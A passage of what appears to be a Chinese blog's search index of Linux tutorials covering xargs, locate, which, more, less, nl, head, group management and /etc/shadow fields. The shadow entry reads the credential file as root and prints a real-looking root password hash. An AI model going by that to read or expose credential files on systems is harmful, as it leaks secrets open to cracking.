test4[root@localhost test]# cd test4[root@localhost test4]# find . -name "file" | xargs -I [] cp [] ..[root@localhost test4]# ll总计 304-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 05:50 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 -i 参数默认的前面输出用 {} 代替，-I 参数可以指定其他代替字符，如例子中的[] 实例9：xargs 的 -p 参数的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.log" | xargs -p -i mv &#123;&#125; .. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost test3]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:06 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# cd test3[root@localhost test3]# find . -name "*.log" | xargs -p -i mv &#123;&#125; ..mv ./log2015.log .. ?...y[root@localhost test3]# ll总计 0[root@localhost test3]# cd ..[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-p 参数会提示让你确认是否执行后面的命令，y 执行，n 不执行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- locate]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F18.%20Linux%20%E5%91%BD%E4%BB%A4-%20locate%2F</url>
    <content type="text"><![CDATA[Linux 命令- locate&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate 让使用者可以很快速的搜寻档案系统内是否有指定的档案。其方法是先建立一个包括系统内所有档案名称及路径的数据库，之后当寻找时就只需查询这个数据库，而不必实际深入档案系统之中了。在一般的 distribution 之中，数据库的建立都被放在 crontab 中自动执行。 1.命令格式1locate [选择参数] [样式] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate命令可以在搜寻数据库时快速找到档案，数据库由updatedb程序来更新，updatedb是由cron daemon周期性建立的，locate命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是locate所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb每天会跑一次，可以由修改crontab来更新设定值。(etc/crontab) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate指定用在搜寻符合条件的档案，它会去储存档案与目录名称的数据库内，寻找合乎范本样式条件的档案或目录录，可以使用特殊字元（如”*” 或”?”等）来指定范本样式，如指定范本为kcpa*ner, locate会找出所有起始字串为kcpa且结尾为ner的档案或目录，如名称为kcpartner若目录录名称为kcpa_ner则会列出该目录下包括 子目录在内的所有档案。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;locate指令和find找寻档案的功能类似，但locate是透过update程序将硬盘中的所有档案和目录资料先建立一个索引数据库，在 执行loacte时直接找该索引，查询速度会较快，索引数据库一般是由操作系统管理，但也可以直接下达update强迫系统立即修改索引数据库。 命令参数 -e：将排除在寻找的范围之外。 -1：如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的 权限资料。 -f：将特定的档案系统排除在外，例如我们没有到理要把 proc 档案系统中的档案 放在资料库中。 -q：安静模式，不会显示任何错误讯息。 -n：至多显示 n个输出。 -r：使用正规运算式 做寻找的条件。 -o：指定资料库存的名称。 -d：指定资料库的路径 -h：显示辅助讯息 -V：显示程式的版本讯息 4.使用实例实例1：查找和 pwd 相关的所有文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate pwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516peida-VirtualBox ~ # locate pwd/bin/pwd/etc/.pwd.lock/sbin/unix_chkpwd/usr/bin/pwdx/usr/include/pwd.h/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.py/usr/lib/python2.7/dist-packages/twisted/python/fakepwd.pyc/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.py/usr/lib/python2.7/dist-packages/twisted/python/test/test_fakepwd.pyc/usr/lib/syslinux/pwd.c32/usr/share/help/C/empathy/irc-join-pwd.page/usr/share/help/ca/empathy/irc-join-pwd.page/usr/share/help/cs/empathy/irc-join-pwd.page/usr/share/help/de/empathy/irc-join-pwd.page/usr/share/help/el/empathy/irc-join-pwd.page 实例2：搜索 etc 目录下所有以 sh 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate /etc/sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[peida-VirtualBox ~] # locate /etc/sh/etc/shadow/etc/shadow-/etc/shells[peida-VirtualBox ~] # 实例3：搜索 etc 目录下，所有以 m 开头的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1locate /etc/m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[peida-VirtualBox ~] # locate /etc/m/etc/magic/etc/magic.mime/etc/mailcap/etc/mailcap.order/etc/manpath.config/etc/mate-settings-daemon]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsync错误二则、排错过程及解决办法]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F68.%20rsync%E9%94%99%E8%AF%AF%E4%BA%8C%E5%88%99%E3%80%81%E6%8E%92%E9%94%99%E8%BF%87%E7%A8%8B%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[rsync错误二则、排错过程及解决办法 12345678910111213141516171819202122#!/bin/bash##created by zhaopeiwu @ 2015-04-20#FOR control the size of error log of apachePATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:/usr/local/apache2/bin:/usr/local/mysql/binexport PATHlog_path="/usr/local/apache2/logs/"log_size=`du -s $log_path/error_log|cut -f 1`if [ $log_size -gt 100000 ];then mv $log_path/error_log $log_path/error_log_`date +%Y%m%d`; touch $log_path/error_log;finum_del=`ls -t $log_path/error*|wc -l`if [ $num_del -gt 4 ];then ls -t $log_path/error*|tail -$[$num_del-2]|xargs -i rm -f &#123;&#125; 2 &gt; /dev/nullfiexit 0]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- which]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F16.%20Linux%20%E5%91%BD%E4%BB%A4-%20which%2F</url>
    <content type="text"><![CDATA[Linux 命令- which&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们经常在linux要查找某个文件，但不知道放在哪里了，可以使用下面的一些命令来搜索： which 查看可执行文件的位置。 whereis 查看文件的位置。 locate 配合数据库查看文件位置。 find 实际搜寻硬盘查询文件名称。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 1.命令格式1which [可执行文件名称] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which 指令会在 PATH 变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。 3.命令参数 -n:指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名。 -p：与 -n 参数相同，但此处的抱愧了文件的路径。 -w：指定输出时栏位的宽度。 -V：显示版本信息。 4.使用实例实例1：查找文件、显示命令路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which lsmod &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# which pwd/bin/pwd[root@localhost ~]# which adduser/usr/sbin/adduser[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;which 是根据使用者所配置的 PATH 变量内的目录去搜索可运行档的！所以，不同的 PATH 配置内容所找到的命令当然不一样！ 实例2：用 which 去找出 which&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which which &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# which whichalias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde' /usr/bin/which[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;竟然会有两个 which ，其中一个是 alias 就是所谓的 “命令别名”，意思是输入 which 会等于后面接的那串命令！ 实例3：找出 cd 这个命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1which cd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cd 这个常用的命令竟然找不到。为什么呢？这是因为 cd 是 bash 内建的命令！但是 which 默认是找 PATH 内所规范的目录，所以一定找不到的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- more]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F12.%20Linux%20%E5%91%BD%E4%BB%A4-%20more%2F</url>
    <content type="text"><![CDATA[Linux 命令- more&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;more命令，功能类似 cat ，cat命令是整个文件的内容从上到下显示在屏幕上。 more会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能 。more命令从前向后读取文件，因此在启动时就加载整个文件。 1．命令格式1more [-dlfpcsu ] [-num ] [+/ pattern] [+ linenum] [file ... ] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;more命令和cat的功能一样都是查看文件里的内容，但有所不同的是more可以按页来查看文件的内容，还支持直接跳转行等功能。 3．命令参数 +n 从笫n行开始显示 定义屏幕大小为n行 +/pattern 在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示 -c 从顶部清屏，然后显示 -d 提示“Press space to continue，’q’ to quit（按空格键继续，按q键退出）”，禁用响铃功能 -l 忽略Ctrl+l（换页）字符 -p 通过清除窗口而不是滚屏来对文件进行换页，与-c选项相似 -s 把连续的多个空行显示为一行 -u 把文件内容中的下画线去掉 4．常用操作命令： Enter 向下n行，需要定义。默认为1行 Ctrl+F 向下滚动一屏 空格键 向下滚动一屏 Ctrl+B 返回上一屏 = 输出当前行的行号 ：f 输出文件名和当前行的行号 V 调用vi编辑器 !命令 调用Shell，并执行命令 q 退出more 5．命令实例：实例1：显示文件中从第3行起的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more +3 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415[root@localhost test]# cat log2012.log 2012-012012-022012-032012-04-day12012-04-day22012-04-day3======[root@localhost test]# more +3 log2012.log 2012-032012-04-day12012-04-day22012-04-day3======[root@localhost test]# 实例2：从文件中查找第一个出现”day3”字符串的行，并从该处前两行开始显示输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more +/day3 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# more +/day3 log2012.log ...skipping2012-04-day12012-04-day22012-04-day32012-052012-05-day1======[root@localhost test]# 实例3：设定每屏显示行数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1more -5 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# more -5 log2012.log 2012-012012-022012-032012-04-day12012-04-day2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最下面显示了该屏展示的内容占文件总行数的比例，按 Ctrl+F 或者 空格键 将会显示下一屏5条内容，百分比也会跟着变化。 实例4：列一个目录下的文件，由于内容太多，我们应该学会用more来分页显示。这得和管道 | 结合起来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1ls -l | more -5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567891011[root@localhost test]# ls -l | more -5总计 36-rw-r--r-- 1 root root 308 11-01 16:49 log2012.log-rw-r--r-- 1 root root 33 10-28 16:54 log2013.log-rw-r--r-- 1 root root 127 10-28 16:51 log2014.loglrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 25 10-28 17:02 log.log-rw-r--r-- 1 root root 37 10-28 17:07 log.txtdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每页显示5个文件信息，按 Ctrl+F 或者 空格键 将会显示下5条文件信息。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- nl]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F11.%20Linux%20%E5%91%BD%E4%BB%A4-%20nl%2F</url>
    <content type="text"><![CDATA[Linux 命令- nl&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl命令在linux系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。 1．命令格式：1nl [选项]... [文件]... 2．命令参数： -b ：指定行号指定的方式，主要有两种： -b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)； -b t ：如果有空行，空的那一行不要列出行号(默认值)； -n ：列出行号表示的方法，主要有三种： -n ln ：行号在萤幕的最左方显示； -n rn ：行号在自己栏位的最右方显示，且不加 0 ； -n rz ：行号在自己栏位的最右方显示，且加 0 ； -w ：行号栏位的占用的位数。 -p 在逻辑定界符处不重新开始计算。 3．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl 命令读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。 在输出中，nl 命令根据您在命令行中指定的标志来计算左边的行。 输入文本必须写在逻辑页中。每个逻辑页有头、主体和页脚节（可以有空节）。 除非使用 -p 标志，nl 命令在每个逻辑页开始的地方重新设置行号。 可以单独为头、主体和页脚节设置行计算标志（例如，头和页脚行可以被计算然而文本行不能）。 4．使用实例：实例1：用 nl 列出 log2012.log 的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1nl log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test]# nl log2012.log 1 2012-012 2012-02 3 ======[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件中的空白行，nl 不会加上行号 实例2：用 nl 列出 log2012.log 的内容，空本行也加上行号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1nl -b a log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234567[root@localhost test]# nl -b a log2012.log 1 2012-012 2012-02345 ======[root@localhost test]# 实例3：让行号前面自动补上0,统一输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910111213141516171819202122232425262728[root@localhost test]# nl -b a -n rz log2014.log 000001 2014-01000002 2014-02000003 2014-03000004 2014-04000005 2014-05000006 2014-06000007 2014-07000008 2014-08000009 2014-09000010 2014-10000011 2014-11000012 2014-12000013 =======[root@localhost test]# nl -b a -n rz -w 3 log2014.log 001 2014-01002 2014-02003 2014-03004 2014-04005 2014-05006 2014-06007 2014-07008 2014-08009 2014-09010 2014-10011 2014-11012 2014-12013 ======= &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nl -b a -n rz 命令行号默认为六位，要调整位数可以加上参数 -w 3 调整为3位。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- less]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F13.%20Linux%E5%91%BD%E4%BB%A4-%20less%2F</url>
    <content type="text"><![CDATA[Linux 命令- less&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;less 工具也是对文件或其它输出进行分页显示的工具，应该说是linux正统查看文件内容的工具，功能极其强大。less 的用法比起 more 更加的有弹性。在 more 的时候，我们并没有办法向前面翻， 只能往后面看，但若使用了 less 时，就可以使用 [pageup] [pagedown] 等按键的功能来往前往后翻看文件，更容易用来查看一个文件的内容！除此之外，在 less 里头可以拥有更多的搜索功能，不止可以向下搜，也可以向上搜。 命令格式1less [参数] [文件] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载真个文件。 命令参数 -b &lt;缓冲区大小&gt; 设置缓冲区的大小 -e 当文件显示结束后，自动离开 -f 强迫打开特殊文件，例如外围设备代号、目录和二进制文件 -g 只标志最后搜索的关键词 -i 忽略搜索时的大小写 -m 显示类似more命令的百分比 -N 显示每行的行号 -o &lt;文件名&gt; 将less 输出的内容在指定文件中保存起来 -Q 不使用警告音 -s 显示连续空行为一行 -S 行过长时间将超出部分舍弃 -x &lt;数字&gt; 将“tab”键显示为规定的数字空格 /字符串：向下搜索“字符串”的功能 ?字符串：向上搜索“字符串”的功能 n：重复前一个搜索（与 / 或 ? 有关） N：反向重复前一个搜索（与 / 或 ? 有关） b 向后翻一页 d 向后翻半页 h 显示帮助界面 Q 退出less 命令 u 向前滚动半页 y 向前滚动一行 空格键 滚动一行 回车键 滚动一页 [pagedown]： 向下翻动一页 [pageup]： 向上翻动一页 使用实例实例1：查看文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1less log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例2：ps 查看进程信息并通过 less 分页显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ps -ef | less &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例3：查看命令示例使用记录并通过 less 分页显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1history | less &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940[root@localhost test]# history | less22 scp -r tomcat6.0.32 root@192.168.120.203:/opt/soft23 cd ..24 scp -r web root@192.168.120.203:/opt/25 cd soft26 ls27 scp -r jdk1.6.0_16/ root@192.168.120.203:/opt/soft28 clear29 vim /etc/profile30 vim /etc/profile31 cd tomcat6.0.32/bin/32 ls33 ./shutdown.sh34 ./startup.sh35 vim startup.sh36 ls37 echo $JAVA_HOME38 java39 ls40 ls41 clear42 cd /opt43 ls44 cp apache-tomcat-6.0.32.tar.gz soft/45 ls46 rm -f apache-tomcat-6.0.32.tar.gz 47 ls48 cd soft49 ls50 tar -vzf apache-tomcat-6.0.32.tar.gz 51 tar -vzfx apache-tomcat-6.0.32.tar.gz 52 tar -zxvf apache-tomcat-6.0.32.tar.gz 53 ls54 cd apache-tomcat-6.0.3255 ls56 cd ..57 mv apache-tomcat-6.0.32 tomcat6.0.3258 ls59 cd tomcat6.0.32/60 ls 实例4：浏览多个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1less log2013.log log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出：n 后，切换到 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出：p 后，切换到 log2013.log 附加备注1.全屏导航 ctrl + F - 向前移动一屏 ctrl + B - 向后移动一屏 ctrl + D - 向前移动半屏 ctrl + U - 向后移动半屏 2.单行导航 j - 向前移动一行 k - 向后移动一行 3.其他导航 G - 移动到最后一行 g - 移动到第一行 q / ZZ - 退出 less 命令 4.其他有用的命令 v - 使用配置的编辑器编辑当前文件 h - 显示 less 的帮助文档 &amp;pattern - 仅显示匹配模式的行，而不是整个文件 5.标记导航 当使用 less 查看大文件时，可以在任何一个位置作标记，可以通过命令导航到标有特定标记的文档位置： ma - 使用 a 标记文本的当前位置 ‘a - 导航到标记 a 处]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 密码文件]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F7.%20Linux%20%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linux 密码文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;密码文件 /etc/shadow 和 ·/etc/passwd·，类似，都是 Linux 系统最重要的文件之一，用 ： 分割成9个字段。 1234[root@localhost ~]# cat /etc/shadow |head -n 3root:$6$Wo0kPkgm$OAp0Wl2AsaE4ei4YVbxo3DIU5OBSYxn1y7qxB5Jns70Yk91AvzElsR5GmoGCC8DUXkKzK7vyiV8wXNeaWNm861:15832:0:99999:7:::bin:*:15628:0:99999:7:::daemon:*:15628:0:99999:7::: 每个字段的含义1. 用户名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跟 /etc/passwd 对应。 2. 用户密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个才是该帐号真正的密码，不过这个密码已经加密了，但是还是能够解密的。所以该文件属性设置为000，但是 root 账户是可以访问或更改的。 12[root@localhost ~]# ls -l /etc/shadow---------- 1 root root 719 5月 10 09:02 /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;root的密码很长，通常以 $6$ 开头；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“*” 表示账户被 锁定&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“!!” 账户还没有密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：CentOS 的加密方式就是 sha-512。 $6$ 开头是 sha-512 ；$5$ 开头是 sha-256 ；$1$ 表明是用 MD5 加密。 3. 上次更改密码的日期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个数字的计算是，距离1970年1月1日到上次更改密码的日期，单位是天。例如上次更改密码的日期为2012年1月1日，则这个值就是 ‘365×(2012-1970)+(2012-1970)÷4+1 = 15341’。因为如果是闰年，则有366天。 4. 要过多少天才可以可以更改密码&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是0，即不限制。 5. 密码多少天后到期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即在多少天内必须更改密码，例如这里设置成30，则30天内必须更改一次密码，否则将不能登录系统，默认是99999，可以理解为永远不需要改。 6. 密码到期前的警告期限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若这个值设置成7，则表示当7天后密码过期时，系统就发出告警告诉用户，提醒用户他的密码将在7天后到期。 7. 帐号失效期限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以这样理解，如果设置这个值为3，则表示：密码已经到期，然而用户并没有在到期前修改密码，那么再过3天，则这个帐号就失效了，即锁定了。 8. 帐号的生命周期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;跟第三段一样，是按距离1970年1月1日多少天算的。它表示的含义是，帐号在这个日期前可以使用，到期后帐号作废。 9. 作为保留用的&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;没有什么意义。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 增加和删除用户组]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F8.%20Linux%20%E5%A2%9E%E5%8A%A0%E5%92%8C%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7%E7%BB%84%2F</url>
    <content type="text"><![CDATA[Linux 增加和删除用户组1.新增一个组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：groupadd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1groupadd [-g GID] groupname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不加“-g”选项则按照系统默认的 gid 创建组，跟用户一样，gid 也是从 500 开始的。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 123[root@localhost ~]# groupadd grptest1[root@localhost ~]# tail -n1 /etc/groupgrptest1:x:502: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“-g”选项可以自定义 gid。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例： 1234[root@localhost ~]# groupadd -g 511 grptest2[root@localhost ~]# tail -n2 /etc/groupgrptest1:x:502:grptest2:x:511: 2.删除组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：groupdel 12345[root@localhost ~]# groupdel grptest2[root@localhost ~]# tail -n3 /etc/grouptestgroup:x:500:user1:x:501:grptest1:x:502: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令没有特殊选项，但有一种情况不能删除组： 12[root@localhost ~]# groupdel user1groupdel: cannot remove the primary group of user 'user1' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为 user1 组中包含 user1 账户，只有删除 user1 账户后才可以删除组。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- head]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F14.%20Linux%20%E5%91%BD%E4%BB%A4-%20head%2F</url>
    <content type="text"><![CDATA[Linux 命令- head&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;head 与 tail 就像它的名字一样的浅显易懂，它是用来显示开头或结尾某个数量的文字区块， head 用来显示档案的开头至标准输出中，而 tail 想当然就是看档案的结尾。 命令格式1head [参数] [文件] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;head 用来显示档案的开头至标准输出中，默认 head 命令打印其相应文件的开头10行。 命令参数 -q 隐藏文件名 -v 显示文件名 -c&lt;字节&gt; 显示字节数 -n&lt;行数&gt; 显示的行数 使用实例实例1：显示文件的前 n 行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -n 5 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test]# cat log2014.log 2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12==============================[root@localhost test]# head -n 5 log2014.log 2014-012014-022014-032014-042014-05[root@localhost test]# 实例2：显示文件前 n 个字节&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -c 20 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# head -c 20 log2014.log2014-012014-022014[root@localhost test]# 实例3：文件的除了最后 n 个字节意外的内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -c -32 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# head -c -32 log2014.log2014-012014-022014-032014-042014-052014-062014-072014-082014-092014-102014-112014-12[root@localhost test]# 实例4：输出文件除了最后 n 行的全部内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1head -n -6 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# head -n -6 log2014.log2014-012014-022014-032014-042014-052014-062014-07[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 增加删除用户]]></title>
